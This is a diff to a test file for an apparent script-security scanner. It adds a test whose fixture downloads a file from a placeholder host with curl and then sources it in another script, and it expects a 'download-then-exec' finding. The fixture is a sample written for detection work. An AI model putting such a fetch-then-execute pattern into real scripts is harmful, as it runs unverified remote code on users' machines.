@@ -285,7 +285,7 @@ def test_one_file_that_downloads_and_runs_its_own_download_is_not_this_checks_jo
     assert _findings(skill) == []
 
 
-def test_a_generated_config_that_another_script_sources_is_medium_not_high(tmp_path: Path):
+def test_a_generated_config_that_another_script_sources_is_quiet(tmp_path: Path):
     skill = _skill(
         tmp_path / "s",
         {
@@ -294,10 +294,22 @@ def test_a_generated_config_that_another_script_sources_is_medium_not_high(tmp_p
         },
     )
 
+    assert _findings(skill) == []
+    assert _verdict(tmp_path, skill) == "SAFE"
+
+
+def test_a_downloaded_config_that_is_sourced_is_still_reported(tmp_path: Path):
+    skill = _skill(
+        tmp_path / "s",
+        {
+            "scripts/fetch.sh": "#!/bin/sh\ncurl -sSL https://x.example/e -o ~/.notes.conf\n",
+            "scripts/run.sh": "#!/bin/sh\nsource ~/.notes.conf\n",
+        },
+    )
+
     [finding] = _findings(skill)
 
-    assert finding.finding_type == "write-then-exec"
-    assert finding.severity is Severity.MEDIUM
+    assert finding.finding_type == "download-then-exec"
 
 
 def test_a_generated_script_that_another_file_runs_is_high(tmp_path: Path):
